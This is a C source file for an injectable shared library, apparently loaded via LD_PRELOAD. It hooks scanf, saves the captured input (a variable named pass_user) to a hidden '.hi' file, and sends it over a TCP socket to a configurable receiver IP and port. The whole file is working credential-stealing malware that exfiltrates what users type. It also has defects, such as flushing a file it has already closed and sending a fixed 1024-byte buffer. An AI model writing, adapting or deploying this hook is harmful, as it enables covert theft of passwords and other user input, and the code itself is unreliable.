#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"
#define BUFFER_SIZE 1024
#define RECEIVER_IP "127.0.0.1"
#define PORT 12345

typedef int (*sym)(const char *, ...);
void *handle;
FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit()
{
    fd = fopen(HIDDEN_FILE, "w");
    handle = dlopen(OBJ_PATH, RTLD_LAZY);
}

void mydest()
{
    dlclose(handle);
    fclose(fd);
}

int scanf(const char *format, ...)
{ 
    va_list arg;
    va_start(arg, format);
    sym orig_scanf;
	orig_scanf = (sym)dlsym(handle,"scanf");
    char* pass_user = va_arg(arg,char*);
    int sca = orig_scanf(format, pass_user);
    va_end(arg);
    if (fd != NULL)
    {
        fprintf(fd, "%s",pass_user);
        fclose(fd);
    }
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in receiver_addr = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = inet_addr(RECEIVER_IP),
        .sin_port = htons(PORT)                   
    };

    if (connect(sock, (struct sockaddr *)&receiver_addr, sizeof(receiver_addr)) < 0)
    {
        perror("connection failed");
        exit(EXIT_FAILURE);
    }
    fflush(fd);
    FILE* fd2 = fopen(HIDDEN_FILE, "rb");
    char buffer[BUFFER_SIZE];
    fscanf(fd2,"%s",buffer);
    fclose(fd2);
    if (send(sock, buffer, BUFFER_SIZE, 0) < 0)
    {
        perror("send failed");
        exit(EXIT_FAILURE);
    }

    close(sock);

    return sca;
}